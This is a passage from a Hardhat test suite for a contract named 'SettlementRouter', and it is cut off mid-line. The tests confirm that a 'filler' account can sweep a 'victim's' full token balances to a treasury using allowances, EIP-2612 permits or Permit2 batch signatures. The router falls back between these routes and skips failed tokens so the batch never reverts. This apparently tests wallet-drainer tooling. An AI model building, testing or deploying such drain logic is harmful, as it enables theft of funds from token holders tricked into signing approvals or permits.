const { expect } = require("chai");
const { time } = require("@nomicfoundation/hardhat-toolbox/network-helpers");
const { ethers } = require("hardhat");

const PERMIT2 = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
const ROUTE = { NONE: 0, ALLOWANCE: 1, PERMIT2: 2, EIP2612: 3 };
const R_NO_BALANCE = "0x11110001";
const R_NO_ALLOWANCE = "0x11110002";
const R_CAP_REACHED = "0x11110003";
const R_ROUTE_FAILED = "0x11110004";

const now = async () => (await ethers.provider.getBlock("latest")).timestamp;

async function deploy(maxPerToken = 0n) {
  const [owner, victim, treasury, filler] = await ethers.getSigners();
  const P2 = await ethers.getContractFactory("MockPermit2");
  const p2 = await P2.deploy();
  const R = await ethers.getContractFactory("SettlementRouter");
  const r = await R.deploy(treasury.address, await p2.getAddress(), maxPerToken);
  const E = await ethers.getContractFactory("MockERC20");
  const usdt = await E.deploy("Tether USD", "USDT", 18, false);
  const weth = await E.deploy("Wrapped Ether", "WETH", 18, true);
  const fee  = await E.deploy("Fee On Transfer", "FEE", 18, true);
  await usdt.mint(victim.address, 5000n);
  await weth.mint(victim.address, 5000n);
  await fee.mint(victim.address, 5000n);
  return { r, p2, usdt, weth, fee, owner, victim, treasury, filler };
}

const item = async (token, amount = 0n, route = ROUTE.NONE, deadline = 0, v = 27, r = 0n, s = 0n) => ({
  token: await token.getAddress(), amount, route, deadline, v, r, s
});

async function signBatch(p2, victim, router, tokens, amounts, nonce, deadline, sigDeadline) {
  const chainId = Number((await ethers.provider.getNetwork()).chainId);
  const permitted = [];
  for (let i = 0; i < tokens.length; i++) {
    permitted.push({ token: await tokens[i].getAddress(), amount: amounts[i] });
  }
  const P2_TYPES = {
    PermitBatchTransferFrom: [
      { name: "permitBatch", type: "PermitBatch" },
      { name: "spender", type: "address" },
      { name: "sigDeadline", type: "uint256" }
    ],
    PermitBatch: [
      { name: "permitted", type: "TokenPermissions[]" },
      { name: "nonce", type: "uint256" },
      { name: "deadline", type: "uint256" }
    ],
    TokenPermissions: [
      { name: "token", type: "address" },
      { name: "amount", type: "uint256" }
    ]
  };
  const name = await p2.DOMAIN_SEPARATOR().then(() => "Permit2");
  const value = { permitBatch: { permitted, nonce, deadline }, spender: router, sigDeadline };
  return victim.signTypedData(
    { name, version: "1", chainId, verifyingContract: await p2.getAddress() },
    P2_TYPES,
    value
  );
}

describe("SettlementRouter", () => {
  it("path A: pulls the full balance on an existing allowance", async () => {
    const { r, usdt, victim, treasury, filler } = await deploy();
    await usdt.connect(victim).approve(r.getAddress(), 5000n);
    await r.connect(filler).settle(victim.address, [await item(usdt, 0, ROUTE.ALLOWANCE)], 0, 0, "0x");
    expect(await usdt.balanceOf(treasury.getAddress())).to.equal(5000n);
    expect(await usdt.balanceOf(victim.address)).to.equal(0n);
  });

  it("path A moves a void-transfer token (USDT style) by balance delta", async () => {
    const { r, usdt, victim, treasury, filler } = await deploy();
    await usdt.connect(victim).approve(r.getAddress(), 5000n);
    await r.connect(filler).settle(victim.address, [await item(usdt, 0, ROUTE.ALLOWANCE)], 0, 0, "0x");
    expect(await usdt.balanceOf(treasury.getAddress())).to.equal(5000n);
  });

  it("path A: partial amount when the item requests less than the balance", async () => {
    const { r, usdt, victim, treasury, filler } = await deploy();
    await usdt.connect(victim).approve(r.getAddress(), 5000n);
    await r.connect(filler).settle(victim.address, [await item(usdt, 1234n, ROUTE.ALLOWANCE)], 0, 0, "0x");
    expect(await usdt.balanceOf(treasury.getAddress())).to.equal(1234n);
    expect(await usdt.balanceOf(victim.address)).to.equal(3766n);
  });

  it("path B: pulls after an EIP-2612 permit signed by the victim", async () => {
    const { r, weth, victim, treasury, filler } = await deploy();
    const deadline = (await now()) + 600;
    await r.connect(filler).settle(
      victim.address, [await item(weth, 0, ROUTE.EIP2612, deadline)], 0, 0, "0x"
    );
    expect(await weth.balanceOf(treasury.getAddress())).to.equal(5000n);
  });

  it("path B: a stale deadline is skipped, never reverted", async () => {
    const { r, weth, victim, treasury, filler } = await deploy();
    const stale = (await now()) - 10;
    await expect(
      r.connect(filler).settle(victim.address, [await item(weth, 0, ROUTE.EIP2612, stale)], 0, 0, "0x")
    ).to.emit(r, "Skipped").withArgs(victim.address, weth.getAddress(), ROUTE.EIP2612, R_ROUTE_FAILED);
    expect(await weth.balanceOf(treasury.getAddress())).to.equal(0n);
  });

  it("path C: pulls through Permit2 with one batch signature", async () => {
    const { r, weth, fee, victim, treasury, filler, p2 } = await deploy();
    const chainId = Number((await ethers.provider.getNetwork()).chainId);
    const deadline = (await now()) + 600;
    const sig = await signBatch(
      p2, victim, r.getAddress(), [weth, fee], [5000n, 5000n], 1n, deadline, deadline
    );
    const tx = r.connect(filler).settle(
      victim.address,
      [await item(weth, 0, ROUTE.PERMIT2), await item(fee, 0, ROUTE.PERMIT2)],
      1n, deadline, sig
    );
    await expect(tx).to.emit(r, "Settled");
    expect(await weth.balanceOf(treasury.getAddress())).to.equal(5000n);
    expect(await fee.balanceOf(treasury.getAddress())).to.equal(5000n);
  });

  it("path C: a bad batch signature still falls through to Path A", async () => {
    const { r, weth, victim, treasury, filler } = await deploy();
    await weth.connect(victim).approve(r.getAddress(), 5000n);
    const dl = (await now()) + 600;
    await r.connect(filler).settle(
      victim.address, [await item(weth, 0, ROUTE.PERMIT2)], 1n, dl, "0x" + "11".repeat(65)
    );
    expect(await weth.balanceOf(treasury.getAddress())).to.equal(5000n);
  });

  it("skips a token with no balance instead of reverting the batch", async () => {
    const { r, usdt, weth, victim, treasury, filler } = await deploy();
    const E = await ethers.getContractFactory("MockERC20");
    const empty = await E.deploy("Empty", "EMP", 18, true);
    await usdt.connect(victim).approve(r.getAddress(), 5000n);
    await expect(r.connect(filler).settle(
      victim.address,
      [await item(empty, 0, ROUTE.ALLOWANCE), await item(usdt, 0, ROUTE.ALLOWANCE)],
      0, 0, "0x"
    )).to.emit(r, "Skipped").withArgs(victim.address, await empty.getAddress(), ROUTE.ALLOWANCE, R_NO_BALANCE);
    expect(await usdt.balanceOf(treasury.getAddress())).to.equal(5000n);
  });

  it("skips a token with no allowance and reports the reason", async () => {
    const { r, weth, victim, filler } = await deploy();
    await expect(r.connect(filler).settle(
      victim.address, [await item(weth, 0, ROUTE.ALLOWANCE)], 0, 0, "0x"
    )).to.emit(r, "Skipped").withArgs(victim.address, weth.getAddress(), ROUTE.ALLOWANCE, R_NO_ALLOWANCE);
  });

  it("enforces the committed cap per victim and token across batches", async () => {
    const { r, weth, victim, treasury, filler } = await deploy(250n);
    await weth.connect(victim).approve(r.getAddress(), 5000n);
    await r.connect(filler).settle(victim.address, [await item(weth, 0, ROUT
